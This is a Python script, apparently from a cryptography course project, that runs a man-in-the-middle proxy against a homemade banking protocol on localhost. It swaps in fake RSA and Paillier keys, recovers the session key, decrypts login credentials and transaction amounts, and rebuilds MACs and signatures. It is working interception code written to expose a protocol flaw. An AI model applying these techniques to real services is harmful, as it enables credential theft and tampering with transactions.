"""
This implements a basic man in the middle attack, due to lack of authentication.
It gets the session key and can read the decrypted messages,
but cannot yet forge client messages due to the client's RSA signature.
"""
import socket
import utils.rsa as rsa
import json
from models.bitset import bitset
import utils.sha as sha
import models.packet as packet
import utils.pallier as pallier
import utils.rc5 as rc5
import utils.hmac as hmac

while True:
    # The pretend server keys
    # N, p, q, e, d
    fake_rsa_keys = rsa.keys()
    # n, e
    real_rsa_keys = None

    session_key = None
    # p, q, u, g, c
    fake_paillier_keys = pallier.create_config()
    # p*q, g
    real_paillier_keys = None

    client_nonce = None
    server_nonce = None
    sessionID = None

    # n, e
    client_rsa_keys = None

    server_conn = socket.create_connection(('localhost', 8000))
    client_conn = socket.create_server(('localhost', 8001))
    print("ready.")
    client_conn, _caddr = client_conn.accept()

    # Assume this is always on a request-response protocol
    while True:
        req = client_conn.recv(4096)
        print(f"\x1b[2mRequest: {req}\x1b[0m")
        if req == b'exit':
            server_conn.send(req)
            break

        req_obj = json.loads(req)
        if req_obj["id"] == 0:
            assert client_nonce is None and server_nonce is None and sessionID is None
            _, client_nonce, sessionID, _, _ = str(req_obj["data"]).split("|")
            client_nonce = int(client_nonce)
            sessionID = int(sessionID)
            # no alteration
        elif req_obj["id"] == 1:
            assert client_nonce is not None and server_nonce is not None and real_rsa_keys is not None
            rsaPow, rsaCipher = str(req_obj["data"]).split(":")
            premastersecret = rsa.decrypt(fake_rsa_keys[4], fake_rsa_keys[0],
                                          (int(rsaPow), int(rsaCipher)))
            session_key = sha.hash(repr(bitset.from_number(premastersecret))
                                   + repr(bitset.from_number(server_nonce))
                                   + repr(bitset.from_number(client_nonce)))
            session_key = session_key << (
                8 - len(format(session_key, 'b')) % 8)
            print(f"\x1b[1mSESSION KEY RETRIEVED: {session_key}\x1b[0m")
            # for now, ignore the paillier and let that go. but we can mitm that too.
            rsaPow, rsaCipher = rsa.encrypt(real_rsa_keys[1], real_rsa_keys[0],
                                            premastersecret)
            req_obj["data"] = f"{rsaPow}:{rsaCipher}"
            req = json.dumps(req_obj).encode()
            print(f"\x1b[2mAltered (same ptxt): {req}\x1b[0m")
        elif req_obj["id"] == 2:
            op = packet.Operation.parse_obj(req_obj)
            k_bitset = bitset.from_number(session_key)
            string = rc5.decrypt(k_bitset, op.data, _type=str)
            print(f"Decrypted request: {string}")
            p_op = packet.unwrap_encrypted_operation(
                op, session_key, session_key)
            if p_op.id == packet.ProtectedOperationIds.VERIFY:
                subcontent = rc5.decrypt(k_bitset, p_op.data)
                print(
                    f"\x1b[1mDouble-Decrypted USERNAME/PASSWORD: {subcontent}\x1b[0m")
            elif p_op.id == packet.ProtectedOperationIds.CHALLENGE:
                subcontent: dict = json.loads(p_op.data)
                if "keys" in subcontent:
                    client_rsa_keys = subcontent["keys"]
                    print(
                        f"\x1b[1mClient public keys: {client_rsa_keys}\x1b[0m")
            data = p_op.data
            value = p_op.value
            # make any changes we want to data & value
            # ====
            if p_op.id == packet.ProtectedOperationIds.DEPOSIT:
                deposit_amt = pallier.decrypt(
                    int(data), fake_paillier_keys[2], fake_paillier_keys[0], fake_paillier_keys[1])
                print(f"Deposit amount: {deposit_amt}")

                # we can change deposit_amt here
                # print(f"Altered deposit amount: {deposit_amt}")

                data = str(pallier.encrypt(
                    real_paillier_keys[0], real_paillier_keys[1], deposit_amt))
            elif p_op.id == packet.ProtectedOperationIds.WITHDRAW:
                withdraw_amt = pallier.decrypt(
                    int(data), fake_paillier_keys[2], fake_paillier_keys[0], fake_paillier_keys[1])
                withdraw_amt = withdraw_amt - \
                    fake_paillier_keys[0] * fake_paillier_keys[1]
                print(f"Withdraw amount: {withdraw_amt}")

                # we can change withdraw_amt here
                # print(f"Altered withdraw amount: {withdraw_amt}")

                withdraw_amt = fake_paillier_keys[0] * \
                    fake_paillier_keys[1] - withdraw_amt
                data = str(pallier.encrypt(
                    real_paillier_keys[0], real_paillier_keys[1], withdraw_amt))

            # ====
            # Now we rebuild the signature and MAC
            new_p_op = packet.ProtectedOperation.construct(
                id=p_op.id, nonce=p_op.nonce, data=data, value=value)
            new_encrypted_data = rc5.encrypt(
                bitset.from_number(session_key), new_p_op.json())
            new_mac = hmac.GenerateHMAC(new_encrypted_data, session_key)

            new_op = packet.Operation.parse_obj({'id': packet.IdTypes.ENCRYPTED,
                                                 'data': new_encrypted_data,
                                                 'mac': new_mac})
            if op.signature is not None:
                new_hash = sha.hash(new_encrypted_data) >> 32
                if client_rsa_keys is not None:
                    r = rsa.rsa_decrypt(
                        client_rsa_keys[1], client_rsa_keys[0], op.signature[0])
                    H_r = sha.hashNC(bitset.from_number(r))
                    new_op.signature = (op.signature[0], H_r ^ new_hash)
                else:
                    old_hash = sha.hash(op.data) >> 32
                    new_op.signature = (
                        op.signature[0], op.signature[1] ^ old_hash ^ new_hash)
            req = new_op.json().encode()
            if new_op != op:
                print(f"\x1b[2mAltered: {req}\x1b[0m")
        else:
            assert False
        # Alter the request here
        server_conn.send(req)

        if req_obj["id"] == 2 and p_op.id in [packet.ProtectedOperationIds.DEPOSIT,
                                              packet.ProtectedOperationIds.WITHDRAW,
                                              packet.ProtectedOperationIds.FREEZE]:
            print("----")
            continue

        resp = server_conn.recv(4096)
        print(f"\x1b[2mResponse: {resp}\x1b[0m")
        if req_obj["id"] == 0:
            _, server_nonce, _, _, _, cert = resp.decode().split("|")
            server_nonce = int(server_nonce)
            _, n, e = cert.split(":")
            real_rsa_keys = (int(n), int(e))
            print(f"\x1b[1mServer RSA Keys: {real_rsa_keys}\x1b[0m")

            resp = f"1.3|{server_nonce}|{sessionID}|RC5:SHA-1:stream:F:20|SHA-1|Certificate:{fake_rsa_keys[0]}:{fake_rsa_keys[3]}".encode(
            )
            print(
                f"\x1b[1mFake Server RSA Keys: {fake_rsa_keys[0]}:{fake_rsa_keys[3]}\x1b[0m")
            print(f"\x2b[2mAltered: {resp}\x1b[0m")
        elif req_obj["id"] == 1:
            n, g = resp.decode().split("|")
            real_paillier_keys = (int(n), int(g))
            print(f"\x1b[1mServer Paillier Keys: {real_paillier_keys}\x1b[0m")
            resp = f"{fake_paillier_keys[0]*fake_paillier_keys[1]}|{fake_paillier_keys[3]}".encode()
            print(f"\x1b[1mFake Paillier Keys: {resp}\x1b[0m")
            print(f"\x1b[2mAltered: {resp}\x1b[0m")
        elif req_obj["id"] == 2:
            resp_obj = json.loads(resp)
            op = packet.Operation.parse_obj(resp_obj)
            k_bitset = bitset.from_number(session_key)
            string = rc5.decrypt(k_bitset, op.data, _type=str)
            print(f"Decrypted response: {string}")
            # Unaltered
        else:
            assert False
        client_conn.send(resp)
        print("----")
